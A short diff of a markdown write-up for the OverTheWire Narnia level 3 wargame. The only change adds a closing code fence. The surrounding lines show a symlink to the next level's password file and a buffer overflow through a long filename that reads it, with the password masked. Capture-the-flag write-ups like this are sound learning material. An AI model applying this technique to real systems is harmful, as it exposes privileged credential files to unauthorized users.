@@ -49,6 +49,7 @@ narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ ln -s /etc/narnia_pass/nar
 narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ ls -lh
 total 0
 lrwxrwxrwx 1 narnia3 narnia3 24 Nov 12 07:50 nsimattstiles -> /etc/narnia_pass/narnia4
+```
 The next step is just to pass the binary the long filename for the ifile buffer and then cat out my password file.
 
 ```
@@ -58,3 +59,4 @@ narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp$ cat /tmp/nsimattstiles
 **********
 ÿ/Üÿÿô`narnia3@melinda:/tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/tmp$
 ```
+
